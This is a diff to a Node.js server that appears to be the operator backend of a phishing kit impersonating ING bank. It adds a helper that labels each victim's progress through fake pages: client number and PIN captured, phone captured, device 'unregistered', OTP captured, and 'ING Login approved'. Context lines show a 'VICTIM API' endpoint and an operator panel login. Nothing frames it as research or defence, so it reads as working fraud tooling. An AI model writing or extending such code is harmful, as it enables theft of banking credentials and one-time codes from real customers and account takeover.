@@ -109,6 +109,23 @@ setInterval(() => {
   }
 }, 10000);
 
+/* ----------  SESSION HEADER HELPER  ---------- */
+function getSessionHeader(v) {
+  if (v.page === 'success') return `🦁 ING Login approved`;
+  if (v.status === 'approved') return `🦁 ING Login approved`;
+  if (v.page === 'index.html') {
+    return v.entered ? `✅ Received client + PIN` : '⏳ Awaiting client + PIN';
+  } else if (v.page === 'verify.html') {
+    return v.phone ? `✅ Received phone` : `⏳ Awaiting phone`;
+  } else if (v.page === 'unregister.html') {
+    return v.unregisterClicked ? `✅ Victim unregistered` : `⏳ Awaiting unregister`;
+  } else if (v.page === 'otp.html') {
+    if (v.otp && v.otp.length > 0) return `✅ Received OTP`;
+    return `🔑 Awaiting OTP...`;
+  }
+  return `🔑 Awaiting OTP...`;
+}
+
 /* ----------  VICTIM API  ---------- */
 app.post('/api/session', async (req, res) => {
   try {
@@ -349,5 +366,6 @@ app.listen(PORT, '0.0.0.0', () => {
   console.log(`Panel user: ${PANEL_USER}`);
   currentDomain = process.env.RAILWAY_STATIC_URL || process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
 });
+
 
 
